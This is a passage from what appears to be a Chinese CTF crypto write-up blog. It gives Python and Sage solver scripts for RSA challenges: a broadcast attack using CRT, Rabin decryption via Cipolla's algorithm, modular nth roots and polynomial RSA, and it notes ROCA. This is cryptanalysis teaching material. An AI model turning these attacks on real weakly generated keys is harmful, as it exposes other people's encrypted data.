class="literal">True</span>:</span><br><span class="line">        l = getRandomNBitInteger(kbits)</span><br><span class="line">        b = getRandomNBitInteger(abit)</span><br><span class="line">        q = l * M + <span class="built_in">pow</span>(<span class="number">0x10001</span>, b, M)</span><br><span class="line">        <span class="keyword">if</span> isPrime(q):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    n = p * q</span><br><span class="line">    self.send(<span class="string">b&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n).encode())</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, <span class="number">0x10001</span>, n)</span><br><span class="line">    self.send(<span class="string">b&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c).encode())</span><br><span class="line">    self.request.close()</span><br></pre></td></tr></table></figure><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><ul><li>roca（<a href="https://crocs.fi.muni.cz/_media/public/papers/nemec_roca_ccs17_preprint.pdf"><strong>The Return of Coppersmith’s Attack</strong></a>）攻击<ul><li><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220430164731600.png" alt="m&amp;t"></li></ul></li></ul><h2 id="babyrsa-低加密指数广播攻击"><a href="#babyrsa-低加密指数广播攻击" class="headerlink" title="babyrsa    |低加密指数广播攻击"></a>babyrsa    |低加密指数广播攻击</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n =  []</span><br><span class="line">c =  []</span><br><span class="line">f=<span class="keyword">lambda</span> m,e,n,c:<span class="built_in">pow</span>(m,e,n)==c<span class="comment">#应该是满足这个条件就为1</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(f,[p]*<span class="number">4</span>,[<span class="number">4</span>]*<span class="number">4</span>,n,c))==<span class="number">4</span>)<span class="comment">#也就是说四次加密都是对的，这样总和才能为4</span></span><br><span class="line"><span class="comment">#map(f,m,e,n,c)  e = 4 同明文同指数 多次加密 中国剩余定理</span></span><br></pre></td></tr></table></figure><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">cl, nl</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (reduce(gmpy2.gcd, nl) == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(nl, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(cl, <span class="built_in">list</span>))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, nl)</span><br><span class="line">    cl_ti_nl = [a * (M // m) * gmpy2.invert(M // m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(nl, cl)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, cl_ti_nl) % M</span><br><span class="line"></span><br><span class="line">n =  []</span><br><span class="line">c =  []</span><br><span class="line"></span><br><span class="line">m_4 = CRT(c, n)</span><br><span class="line">p = <span class="built_in">int</span>(gmpy2.iroot(m_4, <span class="number">4</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><ul><li>$m^e ≡ c \mod(n)$ 由CRT得$m^e$,开e次方即解</li></ul><h2 id="Rabin-模4不余3"><a href="#Rabin-模4不余3" class="headerlink" title="Rabin    |模4不余3"></a>Rabin    |模4不余3</h2><ul><li><a href="https://xz.aliyun.com/t/5113">https://xz.aliyun.com/t/5113</a></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import getPrime</span><br><span class="line"><span class="attribute">from</span> random import randint</span><br><span class="line"><span class="attribute">from</span> libnum import *</span><br><span class="line"><span class="attribute">from</span> gmpy<span class="number">2</span> import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> power(s<span class="number">1</span>, s<span class="number">2</span>, k<span class="number">1</span>, k<span class="number">2</span>, w, p):</span><br><span class="line">    <span class="attribute">return</span> ((s<span class="number">1</span>*k<span class="number">1</span>+s<span class="number">2</span>*k<span class="number">2</span>*w)%p, (s<span class="number">1</span>*k<span class="number">2</span>+s<span class="number">2</span>*k<span class="number">1</span>)%p)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> Cipolla_algorithm(p, n):</span><br><span class="line">    <span class="attribute">a</span> = randint(<span class="number">1</span>, p)</span><br><span class="line">    <span class="attribute">w</span> = a ** <span class="number">2</span> - n</span><br><span class="line"></span><br><span class="line">    <span class="attribute">while</span> pow(w, (p-<span class="number">1</span>)/<span class="number">2</span>, p) !=p-<span class="number">1</span> :</span><br><span class="line">        <span class="attribute">a</span> = randint(<span class="number">1</span>, p)</span><br><span class="line">        <span class="attribute">w</span> = a ** <span class="number">2</span> - n</span><br><span class="line"></span><br><span class="line">    <span class="attribute">times</span> = (p+<span class="number">1</span>)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">k1</span> = <span class="number">1</span></span><br><span class="line">    <span class="attribute">k2</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">first</span> = True</span><br><span class="line"></span><br><span class="line">    <span class="attribute">sum1</span> = <span class="number">1</span></span><br><span class="line">    <span class="attribute">sum2</span> = <span class="number">0</span></span><br><span class="line">    <span class="attribute">while</span> times != <span class="number">0</span>:</span><br><span class="line">        <span class="attribute">if</span> first:</span><br><span class="line">            <span class="attribute">k1</span>, k<span class="number">2</span>=power(k<span class="number">1</span>, k<span class="number">2</span>, a, <span class="number">1</span>, w, p)</span><br><span class="line">            <span class="attribute">first</span> = False</span><br><span class="line"></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">k1</span>, k<span class="number">2</span>=power(k<span class="number">1</span>, k<span class="number">2</span>, k<span class="number">1</span>, k<span class="number">2</span>, w, p)</span><br><span class="line"></span><br><span class="line">        <span class="attribute">if</span> times &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="attribute">sum1</span>, sum<span class="number">2</span> = power(sum<span class="number">1</span>, sum<span class="number">2</span>, k<span class="number">1</span>, k<span class="number">2</span>, w, p)</span><br><span class="line">        <span class="attribute">times</span> &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">return</span> sum<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> CRT(c, n):</span><br><span class="line">    <span class="attribute">for</span> i in range(len(n)):</span><br><span class="line">        <span class="attribute">for</span> j in range(i + <span class="number">1</span>, len(n)):</span><br><span class="line">            <span class="attribute">assert</span> gcd(n[i], n[j]) == <span class="number">1</span></span><br><span class="line">    <span class="attribute">assert</span> len(c) == len(n)</span><br><span class="line"></span><br><span class="line">    <span class="attribute">N</span> = reduce(lambda a, b: a*b, n)</span><br><span class="line">    <span class="attribute">x</span> = <span class="number">0</span></span><br><span class="line">    <span class="attribute">for</span> i, j in zip(c, n):</span><br><span class="line">        <span class="attribute">N_i</span> = N/j</span><br><span class="line">        <span class="attribute">N_i_1</span> = invert(N_i, j)</span><br><span class="line">        <span class="attribute">x</span>+=i*N_i*N_i_<span class="number">1</span></span><br><span class="line">    <span class="attribute">return</span> x % N</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="attribute">p</span> = getPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="attribute">while</span> p % <span class="number">4</span> != <span class="number">1</span>:</span><br><span class="line">        <span class="attribute">p</span> = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="attribute">q</span> = getPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="attribute">while</span> q % <span class="number">4</span> != <span class="number">1</span>:</span><br><span class="line">        <span class="attribute">q</span> = getPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="attribute">n</span> = p * q</span><br><span class="line">    <span class="attribute">m</span> = s<span class="number">2</span>n(&#x27;this is plaintext&#x27;)</span><br><span class="line">    <span class="attribute">c</span> = pow(m, <span class="number">2</span>, n)</span><br><span class="line">    <span class="attribute">print</span> &#x27;m is &#x27;+str(m)</span><br><span class="line"></span><br><span class="line">    <span class="attribute">get_x1</span> = Cipolla_algorithm(p, c)</span><br><span class="line">    <span class="attribute">get_x2</span> = Cipolla_algorithm(q, c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attribute">assert</span>  pow(get_x<span class="number">1</span>, <span class="number">2</span>, p) == c % p</span><br><span class="line">    <span class="attribute">assert</span>  pow(get_x<span class="number">2</span>, <span class="number">2</span>, q) == c % q</span><br><span class="line"></span><br><span class="line">    <span class="attribute">c11</span> = get_x<span class="number">1</span></span><br><span class="line">    <span class="attribute">c12</span> = p-get_x<span class="number">1</span></span><br><span class="line">    <span class="attribute">c21</span> = get_x<span class="number">2</span></span><br><span class="line">    <span class="attribute">c22</span> = q-get_x<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">print</span> &#x27;possible m :&#x27; + str(CRT([c<span class="number">11</span>, c<span class="number">21</span>],<span class="meta"> [p, q]))</span></span><br><span class="line"><span class="meta">    print &#x27;possible m :&#x27; + str(CRT([c11, c22], [p, q]))</span></span><br><span class="line"><span class="meta">    print &#x27;possible m :&#x27; + str(CRT([c12, c21], [p, q]))</span></span><br><span class="line"><span class="meta">    print &#x27;possible m :&#x27; + str(CRT([c12, c22], [p, q]))</span></span><br></pre></td></tr></table></figure><h3 id="n次同余方程"><a href="#n次同余方程" class="headerlink" title="n次同余方程"></a>n次同余方程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">150</span>)</span><br><span class="line">x = randint(<span class="number">1</span>, p)</span><br><span class="line">n = <span class="built_in">pow</span>(x, <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line">x1 = nthroot_mod(n,<span class="number">4</span>,p,all_roots=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(x1, <span class="number">4</span>, p) == n</span><br><span class="line"><span class="built_in">print</span> x1</span><br></pre></td></tr></table></figure><h2 id="Swedish-RSA-｜多项式RSA"><a href="#Swedish-RSA-｜多项式RSA" class="headerlink" title="Swedish RSA    ｜多项式RSA"></a>Swedish RSA    ｜多项式RSA</h2><ul><li><a href="https://4xwi11.github.io/posts/a0a0f5aa/?highlight=多项式">参考博客</a></li><li><a href="https://xz.aliyun.com/t/4545">https://xz.aliyun.com/t/4545</a></li><li><a href="https://4xwi11.github.io/posts/80806ae5/?highlight=多项式rsa">https://4xwi11.github.io/posts/80806ae5/?highlight=多项式rsa</a></li></ul><h3 id="有限域上的多项式"><a href="#有限域上的多项式" class="headerlink" title="有限域上的多项式"></a>有限域上的多项式</h3><ul><li><strong>有限域</strong>：有限个数的集合</li><li><strong>有限域多项式</strong>：<strong>系数</strong>属于某个有限域的多项式</li><li><strong>有限域下不可约多项式</strong>：一个多项式<strong>不能被拆</strong>成多个同一有限域下多个多项式的乘积</li></ul><h4 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h4><ol><li><p>对系数定义在GF(p)上的<strong>多项式</strong>N</p><ul><li><p>拆解之，得到<strong>多项式</strong>P、Q</p><p>即：<strong>N = P * Q</strong></p></li></ul></li><li><p>计算N的欧拉函数phi</p><p><strong>如何求phi</strong></p><ul><li><p>记在GF(p)上, X的最高次数为a,则：</p><p>$$\phi (X) = p^a - 1$$</p></li></ul><p>即：$$\phi (N) = \phi (P) * \phi (Q) = (p^{P.degree()}-1)*(p^{Q.degree()}-1)$$</p></li><li><p>选一个整数e，(e, phi)=1，并求出逆元d，e×d≡1(mod phi)</p></li><li><p>加密：$$C= M^e \mod N$$</p></li><li><p>解密：$$M = C^d \mod N$$</p><p><strong>明文转换成多项式</strong></p><ul><li>将明文每个字符转ascii，作为多项式m的<strong>系数</strong></li></ul></li></ol><p>其中e和d都是整数，它们和多项式可以进行模幂运算</p><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">p = <span class="number">43753</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line"></span><br><span class="line">N = <span class="number">34036</span>*x^<span class="number">177</span> + <span class="number">23068</span>*x^<span class="number">176</span> + <span class="number">13147</span>*x^<span class="number">175</span> + <span class="number">36344</span>*x^<span class="number">174</span> + <span class="number">10045</span>*x^<span class="number">173</span> + <span class="number">41049</span>*x^<span class="number">172</span> + <span class="number">17786</span>*x^<span class="number">171</span> + <span class="number">16601</span>*x^<span class="number">170</span> + <span class="number">7929</span>*x^<span class="number">169</span> + <span class="number">37570</span>*x^<span class="number">168</span> + <span class="number">990</span>*x^<span class="number">167</span> + <span class="number">9622</span>*x^<span class="number">166</span> + <span class="number">39273</span>*x^<span class="number">165</span> + <span class="number">35284</span>*x^<span class="number">164</span> + <span class="number">15632</span>*x^<span class="number">163</span> + <span class="number">18850</span>*x^<span class="number">162</span> + <span class="number">8800</span>*x^<span class="number">161</span> + <span class="number">33148</span>*x^<span class="number">160</span> + <span class="number">12147</span>*x^<span class="number">159</span> + <span class="number">40487</span>*x^<span class="number">158</span> + <span class="number">6407</span>*x^<span class="number">157</span> + <span class="number">34111</span>*x^<span class="number">156</span> + <span class="number">8446</span>*x^<span class="number">155</span> + <span class="number">21908</span>*x^<span class="number">154</span> + <span class="number">16812</span>*x^<span class="number">153</span> + <span class="number">40624</span>*x^<span class="number">152</span> + <span class="number">43506</span>*x^<span class="number">151</span> + <span class="number">39116</span>*x^<span class="number">150</span> + <span class="number">33011</span>*x^<span class="number">149</span> + <span class="number">23914</span>*x^<span class="number">148</span> + <span class="number">2210</span>*x^<span class="number">147</span> + <span class="number">23196</span>*x^<span class="number">146</span> + <span class="number">43359</span>*x^<span class="number">145</span> + <span class="number">34455</span>*x^<span class="number">144</span> + <span class="number">17684</span>*x^<span class="number">143</span> + <span class="number">25262</span>*x^<span class="number">142</span> + <span class="number">982</span>*x^<span class="number">141</span> + <span class="number">24015</span>*x^<span class="number">140</span> + <span class="number">27968</span>*x^<span class="number">139</span> + <span class="number">37463</span>*x^<span class="number">138</span> + <span class="number">10667</span>*x^<span class="number">137</span> + <span class="number">39519</span>*x^<span class="number">136</span> + <span class="number">31176</span>*x^<span class="number">135</span> + <span class="number">27520</span>*x^<span class="number">134</span> + <span class="number">32118</span>*x^<span class="number">133</span> + <span class="number">8333</span>*x^<span class="number">132</span> + <span class="number">38945</span>*x^<span class="number">131</span> + <span class="number">34713</span>*x^<span class="number">130</span> + <span class="number">1107</span>*x^<span class="number">129</span> + <span class="number">43604</span>*x^<span class="number">128</span> + <span class="number">4433</span>*x^<span class="number">127</span> + <span class="number">18110</span>*x^<span class="number">126</span> + <span class="number">17658</span>*x^<span class="number">125</span> + <span class="number">32354</span>*x^<span class="number">124</span> + <span class="number">3219</span>*x^<span class="number">123</span> + <span class="number">40238</span>*x^<span class="number">122</span> + <span class="number">10439</span>*x^<span class="number">121</span> + <span class="number">3669</span>*x^<span class="number">120</span> + <span class="number">8713</span>*x^<span class="number">119</span> + <span class="number">21027</span>*x^<span class="number">118</span> + <span class="number">29480</span>*x^<span class="number">117</span> + <span class="number">5477</span>*x^<span class="number">116</span> + <span class="number">24332</span>*x^<span class="number">115</span> + <span class="number">43480</span>*x^<span class="number">114</span> + <span class="number">33406</span>*x^<span class="number">113</span> + <span class="number">43121</span>*x^<span class="number">112</span> + <span class="number">1114</span>*x^<span class="number">111</span> + <span class="number">17198</span>*x^<span class="number">110</span> + <span class="number">22829</span>*x^<span class="number">109</span> + <span class="number">24424</span>*x^<span class="number">108</span> + <span class="number">16523</span>*x^<span class="number">107</span> + <span class="number">20424</span>*x^<span class="number">106</span> + <span class="number">36206</span>*x^<span class="number">105</span> + <span class="number">41849</span>*x^<span class="number">104</span> + <span class="number">3584</span>*x^<span class="number">103</span> + <span class="number">26500</span>*x^<span class="number">102</span> + <span class="number">31897</span>*x^<span class="number">101</span> + <span class="number">34640</span>*x^<span class="number">100</span> + <span class="number">27449</span>*x^<span class="number">99</span> + <span class="number">30962</span>*x^<span class="number">98</span> + <span class="number">41434</span>*x^<span class="number">97</span> + <span class="number">22125</span>*x^<span class="number">96</span> + <span class="number">24314</span>*x^<span class="number">95</span> + <span class="number">3944</span>*x^<span class="number">94</span> + <span class="number">18400</span>*x^<span class="number">93</span> + <span class="number">38476</span>*x^<span class="number">92</span> + <span class="number">28904</span>*x^<span class="number">91</span> + <span class="number">27936</span>*x^<span class="number">90</span> + <span class="number">41867</span>*x^<span class="number">89</span> + <span class="number">25573</span>*x^<span class="number">88</span> + <span class="number">25659</span>*x^<span class="number">87</span> + <span class="number">33443</span>*x^<span class="number">86</span> + <span class="number">18435</span>*x^<span class="number">85</span> + <span class="number">5934</span>*x^<span class="number">84</span> + <span class="number">38030</span>*x^<span class="number">83</span> + <span class="number">17563</span>*x^<span class="number">82</span> + <span class="number">24086</span>*x^<span class="number">81</span> + <span class="number">36782</span>*x^<span class="number">80</span> + <span class="number">20922</span>*x^<span class="number">79</span> + <span class="number">38933</span>*x^<span class="number">78</span> + <span class="number">23448</span>*x^<span class="number">77</span> + <span class="number">10599</span>*x^<span class="number">76</span> + <span class="number">7156</span>*x^<span class="number">75</span> + <span class="number">29044</span>*x^<span class="number">74</span> + <span class="number">23605</span>*x^<span class="number">73</span> + <span class="number">7657</span>*x^<span class="number">72</span> + <span class="number">28200</span>*x^<span class="number">71</span> + <span class="number">2431</span>*x^<span class="number">70</span> + <span class="number">3860</span>*x^<span class="number">69</span> + <span class="number">23259</span>*x^<span class="number">68</span> + <span class="number">14590</span>*x^<span class="number">67</span> + <span class="number">33631</span>*x^<span class="number">66</span> + <span class="number">15673</span>*x^<span class="number">65</span> + <span class="number">36049</span>*x^<span class="number">64</span> + <span class="number">29728</span>*x^<span class="number">63</span> + <span class="number">22413</span>*x^<span class="number">62</span> + <span class="number">18602</span>*x^<span class="number">61</span> + <span class="number">18557</span>*x^<span class="number">60</span> + <span class="number">23505</span>*x^<span class="number">59</span> + <span class="number">17642</span>*x^<span class="number">58</span> + <span class="number">12595</span>*x^<span class="number">57</span> + <span class="number">17255</span>*x^<span class="number">56</span> + <span class="number">15316</span>*x^<span class="number">55</span> + <span class="number">8948</span>*x^<span class="number">54</span> + <span class="number">38</span>*x^<span class="number">53</span> + <span class="number">40329</span>*x^<span class="number">52</span> + <span class="number">9823</span>*x^<span class="number">51</span> + <span class="number">5798</span>*x^<span class="number">50</span> + <span class="number">6379</span>*x^<span class="number">49</span> + <span class="number">8662</span>*x^<span class="number">48</span> + <span class="number">34640</span>*x^<span class="number">47</span> + <span class="number">38321</span>*x^<span class="number">46</span> + <span class="number">18760</span>*x^<span class="number">45</span> + <span class="number">13135</span>*x^<span class="number">44</span> + <span class="number">15926</span>*x^<span class="number">43</span> + <span class="number">34952</span>*x^<span class="number">42</span> + <span class="number">28940</span>*x^<span class="number">41</span> + <span class="number">13558</span>*x^<span class="number">40</span> + <span class="number">42579</span>*x^<span class="number">39</span> + <span class="number">38015</span>*x^<span class="number">38</span> + <span class="number">33788</span>*x^<span class="number">37</span> + <span class="number">12381</span>*x^<span class="number">36</span> + <span class="number">195</span>*x^<span class="number">35</span> + <span class="number">13709</span>*x^<span class="number">34</span> + <span class="number">31500</span>*x^<span class="number">33</span> + <span class="number">32994</span>*x^<span class="number">32</span> + <span class="number">30486</span>*x^<span class="number">31</span> + <span class="number">40414</span>*x^<span class="number">30</span> + <span class="number">2578</span>*x^<span class="number">29</span> + <span class="number">30525</span>*x^<span class="number">28</span> + <span class="number">43067</span>*x^<span class="number">27</span> + <span class="number">6195</span>*x^<span class="number">26</span> + <span class="number">36288</span>*x^<span class="number">25</span> + <span class="number">23236</span>*x^<span class="number">24</span> + <span class="number">21493</span>*x^<span class="number">23</span> + <span class="number">15808</span>*x^<span class="number">22</span> + <span class="number">34500</span>*x^<span class="number">21</span> + <span class="number">6390</span>*x^<span class="number">20</span> + <span class="number">42994</span>*x^<span class="number">19</span> + <span class="number">42151</span>*x^<span class="number">18</span> + <span class="number">19248</span>*x^<span class="number">17</span> + <span class="number">19291</span>*x^<span class="number">16</span> + <span class="number">8124</span>*x^<span class="number">15</span> + <span class="number">40161</span>*x^<span class="number">14</span> + <span class="number">24726</span>*x^<span class="number">13</span> + <span class="number">31874</span>*x^<span class="number">12</span> + <span class="number">30272</span>*x^<span class="number">11</span> + <span class="number">30761</span>*x^<span class="number">10</span> + <span class="number">2296</span>*x^<span class="number">9</span> + <span class="number">11017</span>*x^<span class="number">8</span> + <span class="number">16559</span>*x^<span class="number">7</span> + <span class="number">28949</span>*x^<span class="number">6</span> + <span class="number">40499</span>*x^<span class="number">5</span> + <span class="number">22377</span>*x^<span class="number">4</span> + <span class="number">33628</span>*x^<span class="number">3</span> + <span class="number">30598</span>*x^<span class="number">2</span> + <span class="number">4386</span>*x + <span class="number">23814</span></span><br><span class="line">c = <span class="number">5209</span>*x^<span class="number">176</span> + <span class="number">10881</span>*x^<span class="number">175</span> + <span class="number">31096</span>*x^<span class="number">174</span> + <span class="number">23354</span>*x^<span class="number">173</span> + <span class="number">28337</span>*x^<span class="number">172</span> + <span class="number">15982</span>*x^<span class="number">171</span> + <span class="number">13515</span>*x^<span class="number">170</span> + <span class="number">21641</span>*x^<span class="number">169</span> + <span class="number">10254</span>*x^<span class="number">168</span> + <span class="number">34588</span>*x^<span class="number">167</span> + <span class="number">27434</span>*x^<span class="number">166</span> + <span class="number">29552</span>*x^<span class="number">165</span> + <span class="number">7105</span>*x^<span class="number">164</span> + <span class="number">22604</span>*x^<span class="number">163</span> + <span class="number">41253</span>*x^<span class="number">162</span> + <span class="number">42675</span>*x^<span class="number">161</span> + <span class="number">21153</span>*x^<span class="number">160</span> + <span class="number">32838</span>*x^<span class="number">159</span> + <span class="number">34391</span>*x^<span class="number">158</span> + <span class="number">832</span>*x^<span class="number">157</span> + <span class="number">720</span>*x^<span class="number">156</span> + <span class="number">22883</span>*x^<span class="number">155</span> + <span class="number">19236</span>*x^<span class="number">154</span> + <span class="number">33772</span>*x^<span class="number">153</span> + <span class="number">5020</span>*x^<span class="number">152</span> + <span class="number">17943</span>*x^<span class="number">151</span> + <span class="number">26967</span>*x^<span class="number">150</span> + <span class="number">30847</span>*x^<span class="number">149</span> + <span class="number">10306</span>*x^<span class="number">148</span> + <span class="number">33966</span>*x^<span class="number">147</span> + <span class="number">43255</span>*x^<span class="number">146</span> + <span class="number">20342</span>*x^<span class="number">145</span> + <span class="number">4474</span>*x^<span class="number">144</span> + <span class="number">3490</span>*x^<span class="number">143</span> + <span class="number">38033</span>*x^<span class="number">142</span> + <span class="number">11224</span>*x^<span class="number">141</span> + <span class="number">30565</span>*x^<span class="number">140</span> + <span class="number">31967</span>*x^<span class="number">139</span> + <span class="number">32382</span>*x^<span class="number">138</span> + <span class="number">9759</span>*x^<span class="number">137</span> + <span class="number">1030</span>*x^<span class="number">136</span> + <span class="number">32122</span>*x^<span class="number">135</span> + <span class="number">42614</span>*x^<span class="number">134</span> + <span class="number">14280</span>*x^<span class="number">133</span> + <span class="number">16533</span>*x^<span class="number">132</span> + <span class="number">32676</span>*x^<span class="number">131</span> + <span class="number">43070</span>*x^<span class="number">130</span> + <span class="number">36009</span>*x^<span class="number">129</span> + <span class="number">28497</span>*x^<span class="number">128</span> + <span class="number">2940</span>*x^<span class="number">127</span> + <span class="number">9747</span>*x^<span class="number">126</span> + <span class="number">22758</span>*x^<span class="number">125</span> + <span class="number">16615</span>*x^<span class="number">124</span> + <span class="number">14086</span>*x^<span class="number">123</span> + <span class="number">13038</span>*x^<span class="number">122</span> + <span class="number">39603</span>*x^<span class="number">121</span> + <span class="number">36260</span>*x^<span class="number">120</span> + <span class="number">32502</span>*x^<span class="number">119</span> + <span class="number">17619</span>*x^<span class="number">118</span> + <span class="number">17700</span>*x^<span class="number">117</span> + <span class="number">15083</span>*x^<span class="number">116</span> + <span class="number">11311</span>*x^<span class="number">115</span> + <span class="number">36496</span>*x^<span class="number">114</span> + <span class="number">1300</span>*x^<span class="number">113</span> + <span class="number">13601</span>*x^<span class="number">112</span> + <span class="number">43425</span>*x^<span class="number">111</span> + <span class="number">10376</span>*x^<span class="number">110</span> + <span class="number">11551</span>*x^<span class="number">109</span> + <span class="number">13684</span>*x^<span class="number">108</span> + <span class="number">14955</span>*x^<span class="number">107</span> + <span class="number">6661</span>*x^<span class="number">106</span> + <span class="number">12674</span>*x^<span class="number">105</span> + <span class="number">21534</span>*x^<span class="number">104</span> + <span class="number">32132</span>*x^<span class="number">103</span> + <span class="number">34135</span>*x^<span class="number">102</span> + <span class="number">43684</span>*x^<span class="number">101</span> + <span class="number">837</span>*x^<span class="number">100</span> + <span class="number">29311</span>*x^<span class="number">99</span> + <span class="number">4849</span>*x^<span class="number">98</span> + <span class="number">26632</span>*x^<span class="number">97</span> + <span class="number">26662</span>*x^<span class="number">96</span> + <span class="number">10159</span>*x^<span class="number">95</span> + <span class="number">32657</span>*x^<span class="number">94</span> + <span class="number">12149</span>*x^<span class="number">93</span> + <span class="number">17858</span>*x^<span class="number">92</span> + <span class="number">35805</span>*x^<span class="number">91</span> + <span class="number">19391</span>*x^<span class="number">90</span> + <span class="number">30884</span>*x^<span class="number">89</span> + <span class="number">42039</span>*x^<span class="number">88</span> + <span class="number">17292</span>*x^<span class="number">87</span> + <span class="number">4694</span>*x^<span class="number">86</span> + <span class="number">1497</span>*x^<span class="number">85</span> + <span class="number">1744</span>*x^<span class="number">84</span> + <span class="number">31071</span>*x^<span class="number">83</span> + <span class="number">26246</span>*x^<span class="number">82</span> + <span 